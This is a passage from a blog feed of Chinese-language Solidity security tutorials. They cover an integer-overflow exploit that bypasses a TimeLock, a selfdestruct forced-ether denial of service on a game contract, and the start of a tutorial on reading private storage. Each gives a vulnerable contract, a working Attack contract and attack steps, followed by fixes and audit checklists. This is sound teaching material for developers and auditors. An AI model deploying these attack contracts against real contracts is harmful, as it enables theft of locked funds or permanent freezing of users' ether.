        <content type="html"><![CDATA[<h1 id="整数溢出-2"><a href="#整数溢出-2" class="headerlink" title="整数溢出_2"></a>整数溢出_2</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>首先我们还是先来看看溢出是什么：</p><p><strong>算术溢出（arithmetic overflow）或简称为溢出（overflow）</strong>分为两种：上溢和下溢。所谓上溢是指在运行单项数值计算时，当计算产生出来的结果非常大，大于寄存器或存储器所能存储或表示的能力限制就会产生上溢，例如在 solidity 中，uint8 所能表示的范围是 0 - 255 这 256 个数，当使用 uint8 类型在实际运算中计算 255 + 1 是会出现上溢的，这样计算出来的结果为 0 也就是 uint8 类型可表示的最小值。同样的，下溢就是当计算产生出来的结果非常小，小于寄存器或存储器所能存储或表示的能力限制就会产生下溢。例如在 Solidity 中，当使用 uint8 类型计算 0 - 1 时就会产生下溢，这样计算出来的值为 255 也就是 uint8 类型可表示的最大值。</p><p>如果一个合约有溢出漏洞，会导致计算的实际结果和预期的结果产生非常大的差异，这样轻则会影响合约的正常逻辑，重则会导致合约中的资金丢失。但是溢出漏洞是存在版本限制的，在 Solidity &lt; 0.8 时溢出不会报错，当 Solidity &gt;= 0.8 时溢出会报错。所以当我们看到 0.8 版本以下的合约时，就要注意这个合约可能出现溢出问题。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><p>看了前置知识我相信大家对溢出漏洞都有一定的了解了，下面我们来结合合约代码来深入了解溢出漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.6;</span><br><span class="line"></span><br><span class="line">contract TimeLock &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        lockTime[msg.sender] = block.timestamp + 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _secondsToIncrease) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _secondsToIncrease;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0, &quot;Insufficient funds&quot;);</span><br><span class="line">        require(block.timestamp &gt; lockTime[msg.sender], &quot;Lock time not expired&quot;);</span><br><span class="line"></span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们可以看到，TimeLock 合约充当了时间保险库。用户可以将代币通过 deposit 函数存入该合约并锁定，且至少一周内不能提现。当然用户也可以通过 increaseLockTime 函数来增加存储时间，用户在设定的存储期限到期前是无法提取 TimeLock 合约中锁定的代币的。首先我们发现这个合约中的 increaseLockTime 函数和 deposit 函数具有运算功能，并且合约支持的版本是：0.7.6 向上兼容，所以这个合约在算数溢出时是不会报错的，所以我们这里就可以判断这个合约是可能存在溢出漏洞的，这里可利用的函数有两个，一个是 increaseLockTime 函数，一个是 deposit 函数。我们先来分析这两个函数内参数可影响的范围再来决定如何发起攻击：</p><ul><li>deposit 函数存在两个运算操作，第一个是影响用户存入的余额 balances 的，这里传入的参数是可控的，所以这里会有溢出的风险，另一个是影响用户的锁定时间 lockTime 的，但是这里的运算逻辑是每次调用 deposit 存入代币时会给 lockTime 增加一周，由于这里的参数不可控，所以这个运算不会存在溢出风险。</li><li>increaseLockTime 函数是根据用户传入的 _secondsToIncrease 参数来进行运算，从而改变用户的存入代币的锁定时间的，由于这里的 _secondsToIncrease 参数是可控的，所以这里有溢出的风险。</li></ul><p>综上所述，我们发现可利用的参数有两个，分别为 <strong>deposit 函数中的 balances 参数</strong>和 <strong>increaseLockTime 函数中的 _secondsToIncrease 参数</strong>。</p><p>我们先来看 <strong>balances</strong> 参数，如果要让这个参数溢出，我们需要有足够的资金存入才可以（需要 2^256 个代币存入才能导致 balances 溢出并归零），如果要利用这个溢出漏洞的话，我们把大量资金存入自己的账户，并让自己的账户的 balances 溢出并归零，从而清空自己的资产，我觉得在坐的各位没有人会这么做吧。所以这个参数可以认为在攻击者的角度是不可用的。</p><p>我们再看 <strong>_secondsToIncrease</strong> 参数，这个参数是我们调用 increaseLockTime 函数来增加存储时间时传入的，这个参数可以决定我们什么时候可以将自己存入并锁定的代币从合约中取出，我们可以看到这个参数在传入之后是直接与账户对应的锁定时间 lockTime 进行运算的，如果我们操纵 _secondsToIncrease 参数让他在与 lockTime 进行运算后得到的结果产生溢出并归零的话，我们是不是就可以在存储日期到期前将自己账户中的余额取出了呢？</p><p>下面我们来看看攻击合约：</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    TimeLock timeLock;</span><br><span class="line"></span><br><span class="line">    constructor(TimeLock _timeLock) &#123;</span><br><span class="line">        timeLock = TimeLock(_timeLock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        timeLock.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        timeLock.increaseLockTime(</span><br><span class="line">            type(uint).max + 1 - timeLock.lockTime(address(this))</span><br><span class="line">        );</span><br><span class="line">        timeLock.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们将使用 Attack 攻击合约先存入以太后利用合约的溢出漏洞在存储未到期的情况下提取我们在刚刚 TimeLock 合约中存入并锁定的以太：</p><ol><li>首先部署 TimeLock 合约；</li><li>再部署 Attack 合约并在构造函数中传入 TimeLock 合约的地址；</li><li>调用 Attack.attack 函数，Attack.attack 又调用 TimeLock.deposit 函数向 TimeLock 合约中存入一个以太（此时这枚以太将被 TimeLock 锁定一周的时间），之后 Attack.attack 又调用 TimeLock.increaseLockTime 函数，并传入 uint 类型可表示的最大值（2^256 - 1）加 1 再减去当前 TimeLock 合约中记录的锁定时间。此时 TimeLock.increaseLockTime 函数中的 lockTime 的计算结果为 2^256 这个值，在 uint256 类型中 2^256 这个数存在上溢所以计算结果为 2^256 = 0 ，此时我们刚刚存入 TimeLock 合约中的一个以太的锁定时间就变为 0 ；</li><li>这时 Attack.attack 再调用 TimeLock. withdraw 函数将成功通过 block.timestamp &gt; lockTime[msg.sender] 这项检查让我们能够在存储时间未到期的情况下成功提前取出我们刚刚在 TimeLock 合约中存入并锁定的那个以太。</li></ol><p>下面是攻击流程图：</p><p><img src="/2023/06/23/00.security/18.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_2/640.png" alt="图片"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>到这里相信大家对溢出漏洞都有自己的理解了，那么下面我们就以开发者和审计者的角度来分析如何预防溢出漏洞和如何快速找出溢出漏洞：</p><p><strong>作为开发者</strong></p><ul><li>使用 SafeMath 来防止溢出；</li><li>使用 Solidity 0.8 及以上版本来开发合约并慎用 unchecked 因为在 unchecked 修饰的代码块里面是不会对参数进行溢出检查的；</li><li>需要慎用变量类型强制转换，例如将 uint256 类型的参数强转为 uint8 类型由于两种类型的取值范围不同也可能会导致溢出。</li></ul><p><strong>作为审计者</strong></p><ul><li>首先查看合约版本是否在 Solidity 0.8 版本以下或者是否存在 unchecked 修饰的代码块，如果存在则优先检查参数的溢出可能并确定影响范围；</li><li>如果合约版本在 Solidity 0.8 版本以下则需要查看合约是否引用了 SafeMath；</li><li>如果使用了 SafeMath 我们需要注意合约中有没有强制类型转换，如果有的话则可能会存在溢出的风险；</li><li>如果没有使用 SafeMath 且合约中存在算术运算的我们就可以认为这个合约是可能存在溢出风险的，在实际审计中还要结合实际代码来看。</li></ul><p>引用：<a href="https://mp.weixin.qq.com/s/7lqM7MlKqvQBKBRCX-Nxgg">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17.自毁函数漏洞</title>
      <link href="/2023/06/23/00.security/17.%C3%97O%CC%82%C2%BBU%CC%80%C2%BA%C2%AFE%CC%82u%CC%9BA%CC%82%C2%A9%C2%B6%C2%B4/"/>
      <url>/2023/06/23/00.security/17.%C3%97O%CC%82%C2%BBU%CC%80%C2%BA%C2%AFE%CC%82u%CC%9BA%CC%82%C2%A9%C2%B6%C2%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="自毁函数漏洞"><a href="#自毁函数漏洞" class="headerlink" title="自毁函数漏洞"></a>自毁函数漏洞</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>我们先来了解 solidity 中能够转账的操作都有哪些：</p><ul><li>transfer：转账出错会抛出异常后面代码不执行；</li><li>send：转账出错不会抛出异常只返回 true/false 后面代码继续执行</li><li>call.value().gas()()：转账出错不会抛出异常只返回 true/false 后面代码继续执行，且使用 call 函数进行转账容易发生重入攻击</li></ul><p>上面三种都需要目标有payable的fallback或者receive函数，才能成功将代币转入目标地址，下面我们来看一个不需要接受就能给合约转账的函数：自毁函数。</p><p><strong>自毁函数</strong>由以太坊智能合约提供，用于销毁区块链上的合约系统。当合约执行自毁操作时，合约账户上剩余的以太币会发送给指定的目标，然后其存储和代码从状态中被移除。然而，自毁函数也是一把双刃剑，一方面它可以使开发人员能够从以太坊中删除智能合约，并在紧急情况下转移以太币。另一方面自毁函数也可能成为攻击者的利用工具，攻击者可以利用该函数向目标合约“强制转账”从而影响目标合约的正常功能（比如开发者使用 address(this).balance ，合约中的代币余额就可能会被攻击）。今天我们就来看一个攻击者利用自毁函数的强制转账特性，对智能合约发起攻击导致目标合约瘫痪的案例。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><p>下面我们来看目标合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">contract EtherGame &#123;</span><br><span class="line">    uint public targetAmount = 7 ether;</span><br><span class="line">    address public winner;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;You can only send 1 Ether&quot;);</span><br><span class="line"></span><br><span class="line">        uint balance = address(this).balance;</span><br><span class="line">        require(balance &lt;= targetAmount, &quot;Game is over&quot;);</span><br><span class="line"></span><br><span class="line">        if (balance == targetAmount) &#123;</span><br><span class="line">            winner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimReward() public &#123;</span><br><span class="line">        require(msg.sender == winner, &quot;Not winner&quot;);</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>EtherGame 合约实现的功能是一个游戏，我们这里可以称它为“幸运七”。玩家每次向 EtherGame 合约中打入一个以太，第七个成功打入以太的玩家将成为 winner。winner 可以提取合约中的 7 个以太。</p><p>玩家每次玩游戏时都会调用 EtherGame.deposit 函数向合约中先打入一个以太，随后函数会检查合约中的余额(balance)是否小于等于 7 ，只有合约中的余额小于等于 7 时才能继续，否则将回滚。合约中的余额(balance)是通过 address(this).balance 取到的，这就意味着我们只要有办法在产生 winner 之前改变 EtherGame 合约中的余额，让他等于 7 就会使该合约瘫痪。这样我们的攻击方向就明确了，只要我们强制给 EtherGame 合约打入一笔以太，让该合约中的余额大于或等于 7 这样后面的玩家将无法通过 EtherGame.deposit 的检查，从而使 EtherGame 合约瘫痪，永远无法产生 winner。</p><p>但是 EtherGame.deposit 函数中存在验证：require(msg.value == 1 ether, “You can only send 1 Ether”)，这里要求我们每次只能打一个以太进去，所以通过正常路径是不可能一次向 EtherGame 打入大于 1 枚的以太的，但是我们又需要打入大于 1 枚的以太到 EtherGame 合约中，所以需要找到另外的路径，来将以太转入到 EtherGame 合约中。</p><p>这里就要请出我们今天的主角：自毁函数——selfdestruct。从前置知识中我们可以看到，当合约执行自毁操作时，合约账户上剩余的以太币会发送给指定的目标，我们可以构造一个攻击合约，然后触发 selfdestruct 函数让攻击合约自毁，攻击合约中的以太就会发送给目标合约。这样我们就可以一次向 EtherGame 合约中打入多枚以太，而不通过 EtherGame.deposit 函数，从而完成攻击。</p><p>举个例子：在极端情况下，如果已经有六个玩家参与了游戏且成功向合约中各自打入了 1 个以太，此时合约中有 6 枚以太，这样我们只需要用 selfdestruct 强制打入一枚以太，而不走 EtherGame.deposit 的逻辑，就会导致 EtherGame 合约记账错误， 从而导致合约瘫痪(DoS)，就会造成合约中的 6 枚以太无法取出，因为此时还没有诞生出 winner。（当然也可以通过 EtherGame.deposit 将以太转入到合约中，这样是可以成为 winner ，然后取出合约中的 7 枚以太，不过这种情况我们就先不做讨论，本篇仅讨论 selfdestruct 的本身的机制可能带来的攻击面）。</p><p>下面我们来看攻击合约：</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    EtherGame etherGame;</span><br><span class="line"></span><br><span class="line">    constructor(EtherGame _etherGame) &#123;</span><br><span class="line">        etherGame = EtherGame(_etherGame);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        </span><br><span class="line">        address payable addr = payable(address(etherGame));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们还是引用三个角色来讲解攻击合约的攻击过程（以下过程纯属虚构，目的是为了帮助大家更好的理解攻击过程，请勿较真！）</p><p>玩家一：Alice</p><p>玩家二：Bob</p><p>攻击者：Eve</p><ol><li>开发者部署 EtherGame 合约；</li><li>玩家 Alice 决定玩游戏，她这辈子玩游戏从来没赢过，她觉得这个游戏可以让她体验一次当 winner 的快感，所以她决定连续调用 EtherGame.deposit 存入 7 个以太这样她就一定是 winner！正当她操作到第六次眼看还有一次今成功的时候，意外发生了（此时合约中已经有 Alice 存入的 6 个以太了）；</li><li>攻击者 Eve 部署 Attack 合约并在构造函数中传入 EtherGame 合约的地址；</li><li>攻击者 Eve 调用 Attack.attack 并设置 msg.value = 1 ，函数触发 selfdestruct 将这 1 个以太强制打入 EtherGame 合约中。此时 EtherGame 合约中有 7 个以太（分别为 Alice 的六个以太和攻击者刚刚打入的 1 个以太）；</li><li>这时玩家 Bob 也决定玩游戏，存入 1 个以太后合约中有 7+1=8 个以太，无法通过 require(balance &lt;= targetAmount, “Game is over”) 的检查并回滚。到这里我们已经成功的使 EtherGame 合约瘫痪了，这个游戏将永远不会产生 winner，Alice 的 winner 梦也就此破灭了，6 个以太被永远的锁在了 EtherGame 合约中。哎，可怜的 Alice 。</li></ol><p>下面是攻击流程图：</p><p><img src="/2023/06/23/00.security/17.%C3%97O%CC%82%C2%BBU%CC%80%C2%BA%C2%AFE%CC%82u%CC%9BA%CC%82%C2%A9%C2%B6%C2%B4/640.jpeg" alt="图片"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>看到这里我相信大家对自毁函数的功能及其危害都有一定的了解了。下面我们还是用开发者和审计者这两个角色来分析如何发现和预防通过自毁函数的攻击：</p><p><strong>作为开发者</strong></p><p>这里我们就拿上面的漏洞合约 EtherGame 来说，这个合约可以被攻击者攻击是因为依赖了 address(this).balance 来获取合约中的余额且这个值可以影响业务逻辑，所以我们这里可以设置一个变量 balance，只有玩家通过 EtherGame.deposit 成功向合约打入以太后 balance 才会增加。这样只要不是通过正常途径进来的以太都不会影响我们的 balance 了，避免强制转账导致的记账错误。下面是修复代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">contract EtherGame &#123;</span><br><span class="line">    uint public targetAmount = 3 ether;</span><br><span class="line">    uint public balance;</span><br><span class="line">    address public winner;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;You can only send 1 Ether&quot;);</span><br><span class="line"></span><br><span class="line">        balance += msg.value;</span><br><span class="line">        require(balance &lt;= targetAmount, &quot;Game is over&quot;);</span><br><span class="line"></span><br><span class="line">        if (balance == targetAmount) &#123;</span><br><span class="line">            winner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimReward() public &#123;</span><br><span class="line">        require(msg.sender == winner, &quot;Not winner&quot;);</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>作为审计者</strong></p><p>作为审计者我们需要结合真实的业务逻辑来查看 address(this).balance 的使用是否会影响合约的正常逻辑，如果会影响那我们就可以初步认为这个合约存在被攻击者强制打入非预期的资金从而影响正常业务逻辑的可能（比如被 selfdestruct 攻击）。在审计过程中还需要结合实际的代码逻辑来进行分析。</p><p>引用：<a href="https://mp.weixin.qq.com/s/exO9RCeUvysFQkBdMo3RgA">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16.访问私有数据攻击</title>
      <link href="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/"/>
      <url>/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="访问私有数据攻击"><a href="#访问私有数据攻击" class="headerlink" title="访问私有数据攻击"></a>访问私有数据攻击</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>我们先来了解一下 solidity 中的三种数据存储方式：</p><h3 id="storage（存储）"><a href="#storage（存储）" class="headerlink" title="storage（存储）"></a>storage（存储）</h3><ul><li>storage 中的数据被永久存储。其以键值对的形式存储在 slot 插槽中。</li><li>storage 中的数据会被写在区块链中（因此它们会更改状态），这就是为什么使用存储非常昂贵的原因。</li><li>占用 256 位插槽的 gas 成本为 20,000 gas。</li><li>修改 storage 的值将花费 5,000 gas 。</li><li>清理存储插槽时（即将非零字节设置为零），将退还一定量的 gas 。</li><li>storage 共有 2^256 个插槽，每个插槽 32 个字节数据按声明顺序依次存储，数据将会从每个插槽的右边开始存储，如果相邻变量适合单个 32 字节，然后它们被打包到同一个插槽中否则将会启用新的插槽来存储。</li></ul><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640.png" alt="图片"></p><ul><li>storage 中的数组的存储方式就比较独特了，首先，solidity 中的数组分为两种：</li></ul><p>定长数组（长度固定）：定长数组中的每个元素都会有一个独立的插槽来存储。以一个含有三个 uint64 元素的定长数组为例，下图可以清楚的看出其存储方式：</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-16713664971613.png" alt="图片"></p><p>变长数组（长度随元素的数量而改变）：</p><p>变长数组的存储方式就很奇特，在遇到变长数组时，会先启用一个新的插槽 slotA 用来存储数组的长度，其数据存储在另外的编号为 slotV 的插槽中。slotA 表示变长数组声明的位置，用 length 表示变长数组的长度，用 slotV 表示变长数组数据存储的位置，用 value 表示变长数组某个数据的值，用 index 表示 value 对应的索引下标，则</p><p>length = sload(slotA)</p><p>slotV = keccak256(slotA) + index</p><p>value = sload(slotV)</p><p>变长数组在编译期间无法知道数组的长度，没办法提前预留存储空间，所以 Solidity 就用 slotA 位置存储了变长数组的长度。</p><p>我们写一个简单的例子来验证上面描述的变长数组的存储方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract haha&#123;</span><br><span class="line">  </span><br><span class="line">  uint[] user;</span><br><span class="line"></span><br><span class="line">  function addUser(uint a) public returns (bytes memory)&#123;</span><br><span class="line">    user.push(a);</span><br><span class="line">    return abi.encode(user);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署这个合约后调用 addUser 函数并传入参数 a = 998，debug 后可以看出变长数组的存储方式：</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-16713667370826.png" alt="图片"></p><p>其中第一个插槽为（这里存储的是变长数组的长度）：<code>0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</code>,这个值等于：<code>sha3(&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;)</code>，key = 0 这是当前插槽的编号，value = 1 这说明变长数组 user[] 中只有一条数据也就是数组长度为 1 ;</p><p>第二个插槽为（这里存储的是变长数组中的数据）：<code>0x510e4e770828ddbf7f7b00ab00a9f6adaf81c0dc9cc85f1f8249c256942d61d9</code>，这个值等于：<code>sha3(&quot;0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563&quot;)</code>，插槽编号为：<code>key=0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</code>，这个值等于：<code>sha3(&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;)+0</code>，插槽中存储的数据为：<code>value=0x00000000000000000000000000000000000000000000000000000000000003e6</code>，也就是 16 进制表示的 998 ，也就是我们传入的 a 的值。</p><p>为了更准确的验证我们再调用一次 addUser 函数并传入 a=999 可以得到下面的结果：</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-16713669562959.png" alt="图片"></p><p>这里我们可以看到新的插槽为：<code>0x6c13d8c1c5df666ea9ca2a428504a3776c8ca01021c3a1524ca7d765f600979a</code>，这个值等于：<code>sha3(&quot;0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564&quot;)</code>，插槽编号为：<code>key=0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564</code>，这个值等于：<code>sha3(&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;)+1</code>，插槽中的存储数据为：<code>value=0x00000000000000000000000000000000000000000000000000000000000003e7</code>，这个值就是 16 进制表示的 999 也就是我们刚刚调用 addUser 函数传入的 a 的值。</p><p>通过上面的例子应该可以大致理解变长数组的存储方式了。</p><h3 id="memory（内存）"><a href="#memory（内存）" class="headerlink" title="memory（内存）"></a>memory（内存）</h3><ul><li>memory 是一个字节数组，其插槽大小为 256 位（32 个字节）。数据仅在函数执行期间存储，执行完之后，将会被删除。它们不会保存到区块链中。</li><li>读或写一个字节（256 位）需要 3 gas 。</li><li>为了避免给矿工带来太多工作，在进行 22 次读写操作后，之后的读写成本开始上升。</li></ul><h3 id="calldata（调用数据）"><a href="#calldata（调用数据）" class="headerlink" title="calldata（调用数据）"></a>calldata（调用数据）</h3><ul><li>calldata 是一个不可修改的，非持久性的区域，用于存储函数参数，并且其行为基本上类似于 memory。</li><li>调用外部函数的参数需要 calldata，也可用于其他变量。</li><li>它避免了复制，并确保了数据不能被修改。</li><li>带有 calldata 数据位置的数组和结构体也可以从函数中返回，但是不可以为这种类型赋值。</li></ul><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><p>这次我们的目标合约是部署在 Ropsten 上的一个合约。合约地址：<code>0x3505a02BCDFbb225988161a95528bfDb279faD6b</code>。<a href="https://ropsten.etherscan.io/address/0x3505a02BCDFbb225988161a95528bfDb279faD6b#code">链接</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">contract Vault &#123;</span><br><span class="line">    uint public count = 123;</span><br><span class="line">    address public owner = msg.sender;</span><br><span class="line">    bool public isTrue = true;</span><br><span class="line">    uint16 public u16 = 31;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    uint public constant someConst = 123;</span><br><span class="line">    bytes32[3] public data;</span><br><span class="line"></span><br><span class="line">    struct User &#123;</span><br><span class="line">        uint id;</span><br><span class="line">        bytes32 password;</span><br><span class="line">    &#125;</span><br><span class="line">    User[] private users;</span><br><span class="line">    mapping(uint =&gt; User) private idToUser;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addUser(bytes32 _password) public &#123;</span><br><span class="line">        User memory user = User(&#123;id: users.length, password: _password&#125;);</span><br><span class="line"></span><br><span class="line">        users.push(user);</span><br><span class="line">        idToUser[user.id] = 